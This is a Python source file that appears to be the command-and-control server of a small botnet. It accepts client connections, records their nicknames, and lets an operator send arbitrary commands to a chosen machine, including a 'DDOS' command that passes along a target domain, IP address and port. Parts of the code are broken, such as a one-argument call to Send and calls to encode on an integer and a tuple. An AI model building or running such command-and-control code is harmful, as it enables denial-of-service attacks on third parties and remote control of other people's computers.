import socket
import threading

def get_ip():
    s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('10.255.255.255', 1))
    LAN_IP=s.getsockname()[0]
    return LAN_IP


Host=("192.168.1.13")
Port=9090

server=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((get_ip(), Port))
server.listen(5)

clients=[]
Nicknames=[]


def Send(message,Receiver):
    clients[Receiver].send(message)

def handle(client):
    while True:
        try:
            message=client.recv(1024).decode('utf-8')
            print (message)
        except:
            index = clients.index(client)
            clients.remove(client)
            client.close()
            nickname=Nicknames[index]
            Send((nickname,' left!').encode('utf-8'))
            Nicknames.remove(nickname)
            break

def receive():
    while True:
        client,address=server.accept()
        print("Connected with ",str(address))

        client.send('NICK'.encode('utf-8'))
        nickname=client.recv(1024).decode('utf-8')
        print (nickname)
        Nicknames.append(nickname)
        clients.append(client)

        thread1=threading.Thread(target=handle, args=(client,))
        thread1.start()

        thread2=threading.Thread(target=Command)
        thread2.start()

def Command():
    Cmd="CHANGEPC"
    while True:
        if Cmd=="CHANGEPC":
            Computer=input("Computer Name: ")
        Cmd=input("Command: ")
        if Cmd!="CHANGEPC":
            Send(Cmd.encode('utf-8'),Nicknames.index(Computer))
        if Cmd=="DDOS":
            Send(Cmd.encode('utf-8'),Nicknames.index(Computer))
            TargetDN=input("Target Domain Name: ")
            Send(TargetDN.encode('utf-8'),Nicknames.index(Computer))
            TargetIP=input("Target IP Address: ")
            Send(TargetIP.encode('utf-8'),Nicknames.index(Computer))
            TargetPort=int(input("Target Port Number: "))
            Send(TargetPort.encode('utf-8'),Nicknames.index(Computer))


print ("Server is listening...")
receive()